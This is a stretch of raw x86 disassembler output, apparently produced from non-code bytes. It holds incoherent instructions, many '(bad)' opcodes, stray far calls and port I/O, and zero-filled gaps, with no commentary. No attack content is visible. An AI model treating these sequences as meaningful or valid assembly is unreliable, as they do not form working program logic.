  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	aas    
  416481:	(bad)  
  416482:	vmulps ymm5,ymm1,ymm3
  416486:	add    BYTE PTR [eax],al
  416488:	add    eax,0xfe000001
  41648d:	push   ss
  41648e:	sub    DWORD PTR [edx+0x1d6c1cca],ebp
  416494:	outs   dx,BYTE PTR ds:[esi]
  416495:	and    DWORD PTR ds:0x2efeb0f2,eax
  41649b:	mov    ch,BYTE PTR [edx-0x6bf9c79f]
  4164a1:	and    BYTE PTR [eax-0x259284ce],0x8e
  4164a8:	xor    edx,edx
  4164aa:	and    ebx,esp
  4164ac:	pop    ebp
  4164ad:	(bad)  
  4164af:	pop    ebp
  4164b0:	lea    eax,ds:[esi]
  4164b3:	fwait
  4164b4:	fs dec ebx
  4164b6:	and    dh,BYTE PTR [ecx-0x4cdfc233]
  4164bc:	sbb    esp,edx
  4164be:	push   0x55
  4164c0:	jge    0x416472
  4164c2:	sub    BYTE PTR [ebp+0x76],al
  4164c5:	fdivr  DWORD PTR [eax]
  4164c7:	clc    
  4164c8:	mov    al,0x30
  4164ca:	pop    ss
  4164cb:	xchg   ebx,eax
  4164cc:	(bad)  
  4164cd:	test   eax,0x7b8c152e
  4164d2:	sbb    esp,DWORD PTR [ecx]
  4164d4:	or     edx,DWORD PTR [ebx]
  4164d6:	xlat   BYTE PTR ds:[ebx]
  4164d7:	in     al,dx
  4164d8:	dec    esp
  4164d9:	mov    esi,0x87e24742
  4164de:	outs   dx,DWORD PTR ds:[esi]
  4164df:	mov    eax,0x6e8888e1
  4164e4:	scas   eax,DWORD PTR es:[edi]
  4164e5:	mov    ds:0x630c62aa,al
  4164ea:	pushf  
  4164eb:	pop    ecx
  4164ec:	std    
  4164ed:	or     DWORD PTR [edx-0x41],eax
  4164f0:	xor    ebp,DWORD PTR [edx-0x31beee60]
  4164f6:	aam    0xf2
  4164f8:	xor    bl,dh
  4164fa:	mov    ebx,0x25288e8a
  4164ff:	adc    ch,BYTE PTR [esp+edx*2]
  416502:	bnd jbe 0x416503
  416505:	pushf  
  416506:	adc    al,0xb3
  416508:	retf   
  416509:	jbe    0x416507
  41650b:	mov    dl,0xd3
  41650d:	ss xchg ecx,eax
  41650f:	xchg   esp,eax
  416510:	push   es
  416511:	test   BYTE PTR [ebp+0x69e38fe6],bh
  416517:	imul   ebp,DWORD PTR [ecx+edx*1],0x55
  41651b:	or     DWORD PTR [ebp+esi*8-0x201d0f46],eax
  416522:	pushf  
  416523:	xchg   ecx,eax
  416524:	stos   DWORD PTR es:[edi],eax
  416525:	(bad)  
  416526:	jecxz  0x416549
  416528:	cmp    ah,BYTE PTR [esp+esi*4]
  41652b:	push   es
  41652c:	add    ebp,esp
  41652e:	or     al,bl
  416530:	mov    ah,0xde
  416532:	dec    ebp
  416533:	xor    ah,BYTE PTR ds:0xc128bc68
  416539:	dec    edx
  41653a:	xchg   ebp,eax
  41653b:	xchg   ecx,eax
  41653c:	sbb    ch,ah
  41653e:	imul   ebx,edx,0x631e43d1
  416544:	and    BYTE PTR [esi+0x41],bh
  416547:	cdq    
  416548:	xchg   ebx,eax
  416549:	sub    al,0xaa
  41654b:	mov    ebp,0xf7a85357
  416550:	sbb    al,0x99
  416552:	cmp    ebp,ebx
  416554:	push   ebp
  416555:	in     al,dx
  416556:	jno    0x4164fd
  416558:	jge    0x416535
  41655a:	inc    edi
  41655b:	jp     0x4164e8
  41655d:	fwait
  41655e:	push   ss
  41655f:	jne    0x416590
  416561:	inc    edi
  416562:	jle    0x4165c4
  416564:	or     DWORD PTR [edx],edi
  416566:	stos   DWORD PTR es:[edi],eax
  416567:	in     al,0xb9
  416569:	xchg   ecx,eax
  41656a:	cld    
  41656b:	and    eax,0xa3335b98
  416570:	sbb    ah,cl
  416572:	lahf   
  416573:	stos   BYTE PTR es:[edi],al
  416574:	fwait
  416575:	push   ds
  416576:	call   0x701e:0x9fc2a989
  41657d:	enter  0x69ff,0xd9
  416581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416582:	daa    
  416583:	dec    edi
  416584:	jp     0x416550
  416586:	push   0x2e
  416588:	repnz (bad) 
  41658a:	mov    ebx,0x7a39649
  41658f:	cmc    
  416590:	mov    al,BYTE PTR [eax]
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x79b04354]
  416601:	mov    esp,0xec5e77f4
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0x94000001
  41660d:	call   0x3c59:0xdce1c5f0
  416614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416615:	adc    DWORD PTR [ebx+0x5f6ad0c5],edi
  41661b:	push   edx
  41661c:	xor    al,0xca
  41661e:	xchg   ebp,eax
  41661f:	adc    ch,0xed
  416622:	sbb    ecx,DWORD PTR [edi+eax*8+0x5aaa19a]
  416629:	sub    dl,al
  41662b:	mov    ebp,0x28519c5c
  416630:	das    
  416631:	adc    DWORD PTR [edi],esi
  416633:	scas   eax,DWORD PTR es:[edi]
  416634:	mov    ecx,0x531aa887
  416639:	into   
  41663a:	adc    al,0xcf
  41663c:	xchg   DWORD PTR [ecx],ebx
  41663e:	cld    
  41663f:	rcl    BYTE PTR [edx+0x47],0x57
  416643:	dec    edx
  416644:	xchg   ecx,eax
  416645:	test   BYTE PTR [edi-0x521e9d04],al
  41664b:	iret   
  41664c:	stc    
  41664d:	lock lock retf 
  416650:	scas   eax,DWORD PTR es:[edi]
  416651:	jecxz  0x4165eb
  416653:	mov    DWORD PTR [ebx+0x2b9dc9f8],eax
  416659:	pop    ecx
  41665a:	sub    ch,al
  41665c:	xor    al,0x38
  41665e:	(bad)  
  41665f:	arpl   WORD PTR [edi-0x66af0712],cx
  416665:	enter  0x60f5,0x53
  416669:	hlt    
  41666a:	xchg   ebx,eax
  41666b:	fist   WORD PTR [edx]
  41666d:	xchg   BYTE PTR [ebx+ebx*8],bl
  416670:	inc    DWORD PTR [edx+0x675cac4e]
  416676:	(bad)  
  416677:	jg     0x4166ec
  416679:	sbb    esp,DWORD PTR [esp+esi*8-0x460bae5]
  416680:	mov    ecx,0x598822c6
  416685:	out    dx,eax
  416686:	call   0xea337d18
  41668b:	ror    BYTE PTR [edi],0xdd
  41668e:	fs inc ebp
  416690:	mov    ds:0x507f39b8,eax
  416695:	out    dx,al
  416696:	jmp    FWORD PTR [ecx]
  416698:	pop    ebx
  416699:	or     DWORD PTR es:0x43118ae6,esi
  4166a0:	xchg   ecx,eax
  4166a1:	jg     0x4166bd
  4166a3:	fimul  DWORD PTR [edx-0x7068aaf1]
  4166a9:	fld    TBYTE PTR [ecx]
  4166ab:	cmp    cl,BYTE PTR [ecx+0x54a6dc56]
  4166b1:	fucomi st,st(5)
  4166b3:	fs and ebp,ecx
  4166b6:	mov    dl,bh
  4166b8:	adc    DWORD PTR [esi],0xfed875cc
  4166be:	dec    eax
  4166bf:	dec    ecx
  4166c0:	push   ecx
  4166c1:	int3   
  4166c2:	and    ecx,DWORD PTR [edi-0x536cb781]
  4166c8:	push   ecx
  4166c9:	(bad)  
  4166ca:	enter  0x4bfc,0xd9
  4166ce:	jp     0x4166f2
  4166d0:	add    dh,BYTE PTR [ebp-0x1f]
  4166d3:	arpl   WORD PTR [edx-0x21],ax
  4166d6:	mov    ds:0x64e38a7a,eax
  4166db:	(bad)  
  4166dc:	or     al,0xd7
  4166de:	push   ebx
  4166df:	xor    al,0xe3
  4166e1:	cld    
  4166e2:	adc    al,0xe9
  4166e5:	out    dx,eax
  4166e6:	test   eax,0x54302e2a
  4166eb:	add    dh,BYTE PTR [eax+0x7f148061]
  4166f1:	imul   edx,ebp,0xffffffb7
  4166f4:	push   esp
  4166f5:	cmp    edx,ebp
  4166f7:	pop    eax
  4166f8:	rcr    BYTE PTR cs:[edx-0x62],cl
  4166fc:	test   BYTE PTR [edi-0x13279219],cl
  416702:	dec    esp
  416703:	retf   0x9fae
  416706:	fsubr  QWORD PTR [eax-0x51]
  416709:	push   es
  41670a:	add    edx,DWORD PTR [eax]
  41670c:	jb     0x4166d5
  41670e:	js     0x41676f
  416710:	enter  0x0,0x0
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	adc    al,0xd5
  416782:	adc    eax,0xed6384
  416787:	add    BYTE PTR ds:0xbd000001,al
  41678d:	inc    ebx
  41678e:	mov    cs,WORD PTR [edx+0x60071396]
  416794:	add    al,0x0
  416796:	ds jae 0x416816
  416799:	bound  esp,QWORD PTR [edi+0x22e6be9a]
  41679f:	mov    bh,0xed
  4167a1:	std    
  4167a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a3:	and    al,0x55
  4167a5:	test   DWORD PTR [edi-0x1ee5deb4],esi
  4167ab:	jo     0x4167c9
  4167ad:	js     0x416768
  4167af:	sbb    al,0x13
  4167b1:	loope  0x416818
  4167b3:	pop    esp
  4167b4:	scas   al,BYTE PTR es:[edi]
  4167b5:	popf   
  4167b6:	lods   eax,DWORD PTR ds:[esi]
  4167b7:	std    
  4167b8:	pop    edi
  4167b9:	dec    ebx
  4167ba:	adc    eax,esp
  4167bc:	dec    edx
  4167bd:	adc    BYTE PTR [esi],0x34
  4167c0:	scas   eax,DWORD PTR es:[edi]
  4167c1:	ins    BYTE PTR es:[edi],dx
  4167c2:	les    ecx,FWORD PTR [ebp-0x630ec98]
  4167c8:	aam    0x68
  4167ca:	inc    ecx
  4167cb:	pop    edi
  4167cc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4167ce:	(bad)  
  4167cf:	or     al,0xdc
  4167d1:	lea    esp,[eax+0x149ccb70]
  4167d7:	xchg   ebp,eax
  4167d8:	sub    DWORD PTR [edi-0x162fb006],eax
  4167de:	mov    ch,0x3
  4167e0:	lahf   
  4167e1:	stc    
  4167e2:	pop    ds
  4167e3:	or     DWORD PTR [ebx+0x0],edi
  4167e6:	out    dx,eax
  4167e7:	(bad)  
  4167e8:	data16 and BYTE PTR [ebp-0x66],bh
  4167ec:	(bad)  
  4167ed:	and    eax,0x120ac55b
  4167f2:	jl     0x4167d5
  4167f4:	inc    eax
  4167f5:	jno    0x41680a
  4167f7:	or     ch,BYTE PTR [eax+0x117c7d9a]
  4167fd:	xor    al,0x75
  4167ff:	add    edx,ecx
  416801:	loop   0x4167ec
  416803:	mov    WORD PTR [esi-0x18],?
  416806:	sbb    eax,eax
  416808:	test   DWORD PTR [eax-0x2abb06cf],0xa1a9c699
  416812:	push   0x42f15dad
  416817:	sub    edx,DWORD PTR [edx]
  416819:	mov    edi,0x7c4b7cb7
  41681e:	mov    eax,0x7ecc24b1
  416823:	ins    DWORD PTR es:[edi],dx
  416824:	test   eax,0x6027c0d1
  416829:	outs   dx,BYTE PTR ds:[esi]
  41682a:	pop    ecx
  41682b:	add    DWORD PTR [eax+0x55],0xffffffbe
  41682f:	sub    eax,0x14603247
  416834:	xchg   ecx,eax
  416835:	dec    ebp
  416836:	sbb    eax,0xb07635d0
  41683b:	jmp    0xb123:0x8e707fd8
  416842:	adc    DWORD PTR [ecx],0x7d041cc7
  416848:	dec    esi
  416849:	fwait
  41684a:	in     al,dx
  41684b:	xchg   ebx,eax
  41684c:	push   edx
  41684d:	jmp    0x6b2e6e6c
  416852:	lods   al,BYTE PTR ds:[esi]
  416853:	cs in  al,dx
  416855:	push   esi
  416856:	mov    ds:0x7d25ff22,al
  41685b:	cmc    
  41685c:	sub    BYTE PTR ds:0x322391c1,dh
  416862:	xlat   BYTE PTR ds:[ebx]
  416863:	lahf   
  416864:	mov    ebp,0x57966f90
  416869:	lock sahf 
  41686b:	fmul   DWORD PTR [ebp-0x1f3a7d30]
  416871:	cmp    BYTE PTR [ebp+0x47],ah
  416874:	mov    ebx,0x8aa6a74d
  416879:	fdivr  DWORD PTR [esi-0x2793034d]
  41687f:	fstp   QWORD PTR [ebx+ebx*2-0x65]
  416883:	mov    bl,0xf
  416885:	jb     0x41686e
  416887:	(bad)  
  416888:	or     dl,BYTE PTR [ebx-0x5874687d]
  41688e:	jnp    0x4168e1
  416890:	mov    eax,0x0
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xb4ed6edb
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [ecx+0x6f],ch
  41690e:	ins    BYTE PTR es:[edi],dx
  41690f:	repnz cwde 
  416911:	jnp    0x41693b
  416913:	and    ah,BYTE PTR [ebp+0x56]
  416916:	aas    
  416917:	call   0x74ff:0x6ce914ea
  41691e:	push   esp
  41691f:	cld    
  416920:	sub    al,0xa6
  416922:	or     eax,0x951ecc4a
  416927:	(bad)  
  416928:	mov    eax,0x98e0984d
  41692d:	addr16 jo 0x416973
  416930:	sti    
  416931:	aas    
  416932:	adc    al,dl
  416934:	mov    ebx,DWORD PTR [esi]
  416936:	rcr    DWORD PTR [ebx-0x6ade6e6c],cl
  41693c:	mov    al,ds:0xb75038e8
  416941:	mov    ecx,0xc0094c18
  416946:	push   es
  416947:	mov    ecx,0x3dd1c42f
  41694c:	mov    dl,0x5
  41694e:	or     eax,0x23f36810
  416953:	add    eax,0x176ea711
  416958:	popf   
  416959:	imul   BYTE PTR [esi]
  41695b:	cmc    
  41695c:	pop    ecx
  41695d:	loopne 0x416916
  41695f:	adc    eax,0xcae142f2
  416964:	and    ah,ah
  416966:	push   ebx
  416967:	pusha  
  416968:	jmp    0x41694d
  41696a:	pop    ss
  41696b:	sbb    BYTE PTR [ecx+0x28ba79f1],0xd0
  416972:	mov    ss:0xb2de35a,eax
  416978:	jns    0x4169cc
  41697a:	je     0x4169dd
  41697c:	add    al,0x25
  41697e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41697f:	fwait
  416980:	ror    DWORD PTR [esp+edi*1],1
  416983:	pushf  
  416984:	mov    edi,DWORD PTR [esi+ecx*1+0x1f]
  416988:	add    eax,0x7214fc8b
  41698d:	in     al,dx
  41698e:	(bad)  
  41698f:	ss (bad) 
  416992:	js     0x4169d8
  416994:	cli    
  416995:	sbb    eax,0x4041eac4
  41699a:	add    BYTE PTR [eax],ch
  41699c:	fisubr DWORD PTR [edx-0x236d4ab3]
  4169a2:	fnstsw WORD PTR [esp+ebx*8-0x31]
  4169a6:	loopne 0x4169d4
  4169a8:	ror    edi,1
  4169aa:	sbb    edi,DWORD PTR [ecx-0x77a245eb]
  4169b0:	and    eax,0x330c4bc1
  4169b5:	mov    DWORD PTR [edx],esi
  4169b7:	(bad)  [eax]
  4169b9:	pop    esp
  4169ba:	add    eax,DWORD PTR [edx]
  4169bc:	mov    DWORD PTR [edi+0x62],esp
  4169bf:	dec    esi
  4169c0:	or     BYTE PTR [ebp-0x4b],dh
  4169c3:	add    dh,BYTE PTR [ebx-0x339706af]
  4169c9:	mov    esi,ebx
  4169cb:	mov    ecx,0x2ab8c152
  4169d0:	in     al,0x9c
  4169d2:	cdq    
  4169d3:	outs   dx,BYTE PTR ds:[esi]
  4169d4:	test   eax,0xc3fbefe8
  4169d9:	mov    bl,0x9
  4169db:	nop
  4169dc:	pop    es
  4169dd:	test   BYTE PTR [esp+ebx*2-0x16],bh
  4169e1:	push   0xffffffeb
  4169e3:	sbb    DWORD PTR ss:[edx],0xffffffdd
  4169e7:	mov    WORD PTR [eax+eiz*4+0x50],?
  4169eb:	es jnp 0x4169a8
  4169ee:	adc    al,0x1b
  4169f0:	call   0x8120:0x8cd53d13
  4169f7:	mov    BYTE PTR [edx+0x4f2fec01],bh
  4169fd:	or     al,0xd7
  4169ff:	fwait
  416a00:	mov    ecx,DWORD PTR ds:0x2cf0c217
  416a06:	adc    eax,0x29f171ca
  416a0b:	fidiv  DWORD PTR [ebp+eiz*4+0x35243e]
	...
  416a72:	add    BYTE PTR [eax],al
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x7c1b0ba3
  416a82:	ret    0x6dc6
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x27000001
  416a8d:	inc    eax
  416a8e:	cmp    ch,bh
  416a90:	mov    ebp,0x78ee995e
  416a95:	or     DWORD PTR [bp+di],edx
  416a98:	(bad)  
  416a99:	mov    ecx,0x873f0b7f
  416a9e:	test   bh,bl
  416aa0:	cmp    eax,0x98a111a2
  416aa5:	sti    
  416aa6:	ins    BYTE PTR es:[edi],dx
  416aa7:	mov    ds:0x4ca26072,eax
  416aac:	adc    ebp,DWORD PTR [esi-0x177c308b]
  416ab2:	aaa    
  416ab3:	pop    eax
  416ab4:	mov    esp,0x65a7842a
  416ab9:	sub    edi,DWORD PTR [edi-0x16]
  416abc:	mov    ch,BYTE PTR [edi+edx*4+0x24]
  416ac0:	out    dx,eax
  416ac1:	bnd jne 0x416ae3
  416ac4:	fidiv  WORD PTR [ebx]
  416ac6:	dec    edx
  416ac7:	fwait
  416ac8:	repnz mov cl,ch
  416acb:	jp     0x416b13
  416acd:	xor    dh,dh
  416acf:	enter  0x179d,0x76
  416ad3:	inc    esi
  416ad4:	sbb    esp,DWORD PTR ds:0x7b55948e
  416ada:	sub    eax,0x41a0ba07
  416adf:	loope  0x416b2e
  416ae1:	mov    DWORD PTR [ebx-0x73],ebx
  416ae4:	cmp    eax,0x15fd5a9a
  416ae9:	fidiv  DWORD PTR [edi+0x3c069c88]
  416aef:	or     edi,DWORD PTR [eax-0x4140fe4f]
  416af5:	fwait
  416af6:	int3   
  416af7:	sub    dh,BYTE PTR [edi]
  416af9:	lods   al,BYTE PTR ds:[esi]
  416afa:	jp     0x416a95
  416afc:	imul   edi,DWORD PTR [esi],0xfffffffc
  416aff:	adc    al,BYTE PTR [ebp+0x38c2f5ad]
  416b05:	repz js 0x416b16
  416b08:	or     eax,0x36fb3722
  416b0d:	bound  eax,QWORD PTR [esi+eax*8-0x224efffc]
  416b14:	mov    ebp,DWORD PTR [ebx]
  416b16:	test   DWORD PTR [edi-0x21],edx
  416b19:	adc    esi,DWORD PTR [ebx-0x5c8ef94a]
  416b1f:	inc    esp
  416b20:	or     DWORD PTR [edi+0x79f7b75e],edi
  416b26:	sar    DWORD PTR [eax],0xa0
  416b29:	arpl   WORD PTR [ebx+eiz*8+0x320956],sp
  416b30:	out    dx,eax
  416b31:	inc    edx
  416b32:	test   DWORD PTR [esi+ecx*2-0x66e81d86],0xc2956878
  416b3d:	lods   eax,DWORD PTR ds:[esi]
  416b3e:	mov    WORD PTR [ebx],ds
  416b40:	fmul   DWORD PTR [ebp+0x215a8c1b]
  416b46:	dec    esi
  416b47:	bound  edi,QWORD PTR [ebx-0x7e]
  416b4a:	xchg   ecx,eax
  416b4b:	in     eax,dx
  416b4c:	ror    DWORD PTR gs:[ecx-0x5e],1
  416b50:	imul   ebx,DWORD PTR [ebx-0x6d],0x1e
  416b54:	loopne 0x416b56
  416b56:	(bad)  
  416b58:	ficom  DWORD PTR [edi-0x71f95818]
  416b5e:	mov    ebx,0xd95ecb52
  416b63:	inc    ebp
  416b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b65:	push   es
  416b66:	inc    ebp
  416b67:	stos   BYTE PTR es:[edi],al
  416b68:	mov    ebx,0xe237b416
  416b6d:	test   esi,edx
  416b6f:	out    dx,eax
  416b70:	test   eax,0xb7bed312
  416b75:	inc    esp
  416b76:	add    al,0x97
  416b78:	call   0x275c:0x2e303c89
  416b7f:	popa   
  416b80:	cmc    
  416b81:	push   ss
  416b82:	fdiv   st(5),st
  416b84:	xor    ebp,esi
  416b86:	push   0x12
  416b88:	xor    DWORD PTR [edi-0x50d42248],esi
  416b8e:	jnp    0x416b48
  416b90:	xchg   edx,eax
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xb55b70a9
  416c01:	das    
  416c02:	fmul   DWORD PTR [edi+0x72]
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    eax,0xb8000001
  416c0d:	sbb    al,cl
  416c0f:	fdivr  QWORD PTR [ecx]
  416c11:	ror    bl,1
  416c13:	not    DWORD PTR ss:[ebx+esi*8-0x50]
  416c18:	cmp    BYTE PTR [edi-0x1a],al
  416c1b:	add    BYTE PTR [edi],0x52
  416c1e:	outs   dx,DWORD PTR ds:[esi]
  416c1f:	inc    ebx
  416c20:	dec    ecx
  416c21:	lods   eax,DWORD PTR ds:[esi]
  416c22:	dec    esp
  416c23:	and    al,0x56
  416c25:	fstp   TBYTE PTR [edi+esi*4]
  416c28:	std    
  416c29:	hlt    
  416c2a:	fwait
  416c2b:	out    dx,eax
  416c2c:	iret   
  416c2d:	cli    
  416c2e:	add    eax,0x86003f51
  416c33:	div    DWORD PTR [ebx+0x6107830]
  416c39:	and    al,0xea
  416c3b:	push   edx
  416c3c:	mov    cl,0x14
  416c3e:	stos   DWORD PTR es:[edi],eax
  416c3f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416c41:	sbb    bl,ch
  416c43:	(bad)  
  416c44:	pop    ebp
  416c45:	retf   0x4003
  416c48:	push   ds
  416c49:	mov    eax,ds:0x1c85339f
  416c4e:	xor    eax,0x5bb20e9b
  416c53:	mov    bh,0x3b
  416c55:	sar    BYTE PTR [esi-0x62494719],cl
  416c5b:	jl     0x416bf4
  416c5d:	ret    0xa631
  416c60:	idiv   DWORD PTR [ecx-0x13d8b009]
  416c66:	jns    0x416cab
  416c68:	sahf   
  416c69:	mov    ch,BYTE PTR [esi+0x2a573861]
  416c6f:	loopne 0x416c31
  416c71:	push   esp
  416c72:	inc    eax
  416c73:	out    0x67,eax
  416c75:	and    DWORD PTR [edi-0x66],0x4da3910d
  416c7c:	test   esp,esi
  416c7e:	mov    ds:0x17f14422,eax
  416c83:	mov    esi,0x749d2f2b
  416c88:	inc    edx
  416c89:	inc    eax
  416c8a:	pop    es
  416c8b:	sti    
  416c8c:	adc    bl,dh
  416c8e:	cmp    al,0xa9
  416c90:	mov    eax,0x1a7e3625
  416c95:	in     al,dx
  416c96:	outs   dx,DWORD PTR ds:[esi]
  416c97:	dec    ebp
  416c98:	iret   
  416c99:	sti    
  416c9a:	rcl    BYTE PTR [ecx-0x1d],0x97
  416c9e:	inc    ebx
  416c9f:	test   DWORD PTR [esp+ecx*8+0x8],ebp
  416ca3:	jg     0x416c4a
  416ca5:	aad    0xe0
  416ca7:	cmp    al,0xf9
  416ca9:	jecxz  0x416cd2
  416cab:	push   edx
  416cac:	adc    BYTE PTR [ebp-0x62],ah
  416caf:	and    eax,0x2551238b
  416cb4:	cmp    al,0xc
  416cb6:	jmp    0xe28:0x41e650c0
  416cbd:	and    dh,BYTE PTR [ecx+0x158db5be]
  416cc3:	mov    ebx,0x7fb56a5b
  416cc8:	mov    WORD PTR [eax+0x1c],fs
  416ccb:	imul   ecx,DWORD PTR [esi+0x62],0xf
  416ccf:	xchg   ebx,eax
  416cd0:	cmovo  edi,esp
  416cd3:	nop
  416cd4:	addr16 nop
  416cd6:	div    ah
  416cd8:	adc    bl,dl
  416cda:	and    DWORD PTR [esi-0x2e681f5e],ecx
  416ce0:	mov    al,ds:0xed99ec62
  416ce5:	push   esi
  416ce6:	xchg   edx,eax
  416ce7:	cli    
  416ce8:	push   esp
  416ce9:	repnz retf 0x8158
  416ced:	pushf  
  416cee:	shr    BYTE PTR [ebx+0x30],cl
  416cf1:	dec    ebp
  416cf2:	jle    0x416d59
  416cf4:	cmp    al,0x41
  416cf6:	sbb    ebp,DWORD PTR [esi+0x3ad9476d]
  416cfc:	mov    eax,0x672141a4
  416d01:	cmp    esi,DWORD PTR [ebp-0x4d0e2509]
  416d07:	dec    esp
  416d08:	icebp  
  416d09:	out    0x0,eax
  416d0b:	fisttp WORD PTR [esi+0x31]
  416d0e:	dec    ecx
  416d0f:	mov    bl,0x51
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	hlt    
  416d81:	add    DWORD PTR [edi-0x6e],ebp
  416d84:	ja     0x416d77
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x1
  416d8d:	xchg   ebp,eax
  416d8e:	out    dx,eax
  416d8f:	lods   eax,DWORD PTR ds:[esi]
  416d90:	popf   
  416d91:	std    
  416d92:	fist   WORD PTR [edx+0x24]
  416d95:	in     eax,0xcf
  416d97:	inc    eax
  416d98:	loopne 0x416da9
  416d9a:	call   0x5d32:0x756439f0
  416da1:	into   
  416da2:	loop   0x416d40
  416da4:	xor    al,0x84
  416da6:	cli    
  416da7:	popa   
  416da8:	ror    DWORD PTR [esi],cl
  416daa:	std    
  416dab:	(bad)  
  416dac:	test   eax,0xf41e246d
  416db1:	inc    ebp
  416db2:	pusha  
  416db3:	mov    edi,0x9ade9969
  416db8:	xchg   DWORD PTR [esi-0x3e],ebx
  416dbb:	dec    esi
  416dbc:	cmp    BYTE PTR ds:0x6b68f600,bh
  416dc2:	scas   al,BYTE PTR es:[edi]
  416dc3:	enter  0x1917,0x15
  416dc7:	lahf   
  416dc8:	imul   ebx,DWORD PTR [esi+0x10],0xca25f5f4
  416dcf:	push   ecx
  416dd0:	xor    ebx,esp
  416dd2:	not    BYTE PTR [esp+ebx*1]
  416dd5:	ja     0x416e4a
  416dd7:	xchg   esp,esp
  416dd9:	xchg   ebp,eax
  416dda:	fdivr  QWORD PTR [edx+eax*1-0x64ba789]
  416de1:	fst    DWORD PTR [ebx+eiz*2+0x1]
  416de5:	out    0x72,al
  416de7:	jne    0x416dab
  416de9:	int    0xa4
  416deb:	das    
  416dec:	inc    ebp
  416ded:	adc    DWORD PTR [eax],edx
  416def:	(bad)  
  416df0:	(bad)  
  416df1:	jmp    0x945b:0xcce2ad95
  416df8:	adc    dh,0x16
  416dfb:	mov    eax,0xc70a1d55
  416e00:	shr    BYTE PTR [ebx],1
  416e02:	push   0x685b002a
  416e07:	jb     0x416e83
  416e09:	xchg   edi,eax
  416e0a:	iret   
  416e0b:	jle    0x416df5
  416e0d:	cmp    al,dl
  416e0f:	(bad)  
  416e10:	les    eax,FWORD PTR [esi+0x7c4708c4]
  416e16:	inc    ecx
  416e17:	fist   WORD PTR [edx+0xb]
  416e1a:	or     esp,edi
  416e1c:	arpl   dx,di
  416e1e:	scas   al,BYTE PTR es:[edi]
  416e1f:	xchg   esp,eax
  416e20:	mov    ch,0xa8
  416e22:	cmp    ch,BYTE PTR [esp+esi*2]
  416e25:	test   DWORD PTR [ecx-0x3a],esp
  416e28:	fild   QWORD PTR [eax-0x2e288964]
  416e2e:	call   0x51c3:0x208cec73
  416e35:	cmp    al,bh
  416e37:	pop    es
  416e38:	jmp    0xb3bf8406
  416e3d:	jns    0x416ddb
  416e3f:	jle    0x416e3b
  416e41:	mov    fs,WORD PTR [esi+0x2abdff0b]
  416e47:	mov    bh,0x53
  416e49:	ins    BYTE PTR es:[edi],dx
  416e4a:	(bad)  
  416e4b:	jae    0x416e50
  416e4d:	xor    al,0xbe
  416e4f:	jmp    0xb61d:0x32db3c42
  416e56:	ret    
  416e57:	and    eax,0x198767af
  416e5c:	or     eax,0xc98440d7
  416e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e62:	dec    esi
  416e63:	icebp  
  416e64:	push   0xffffff84
  416e66:	lds    eax,FWORD PTR [ebp+esi*8+0x5a]
  416e6a:	mov    DWORD PTR [esi-0x19c36460],edx
  416e70:	daa    
  416e71:	(bad)  
  416e72:	int    0xf9
  416e74:	(bad)  
  416e75:	loop   0x416ea9
  416e77:	xchg   ebp,eax
  416e78:	mov    dh,0xb1
  416e7a:	repz pop esi
  416e7c:	mov    ah,0x9d
  416e7e:	push   ds
  416e7f:	push   esp
  416e80:	mov    ebx,0x8f02663
  416e85:	cmp    ebx,esi
  416e87:	ret    
  416e88:	sub    al,0x59
  416e8a:	jmp    0x7c11:0x14be82dc
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x3b128eea
  416f02:	in     al,0x6b
  416f04:	jl     0x416ef8
  416f06:	add    BYTE PTR [eax],al
  416f08:	add    eax,0xb9000001
  416f0d:	or     al,0x92
  416f0f:	add    DWORD PTR ds:0xcd7aaea4,edi
  416f15:	fldcw  WORD PTR [esi+0x37]
  416f18:	inc    eax
  416f19:	jecxz  0x416f09
  416f1b:	mov    edi,0xf6f58a6d
  416f20:	xor    eax,0xa6c08b2a
  416f25:	dec    ebx
  416f26:	cmc    
  416f27:	ins    BYTE PTR es:[edi],dx
  416f28:	jb     0x416f0e
  416f2a:	cli    
  416f2b:	sub    BYTE PTR [ebx-0x3fd5bc3d],0x6d
  416f32:	mov    esi,0xe8b72e3e
  416f37:	loopne 0x416f63
  416f39:	pop    edx
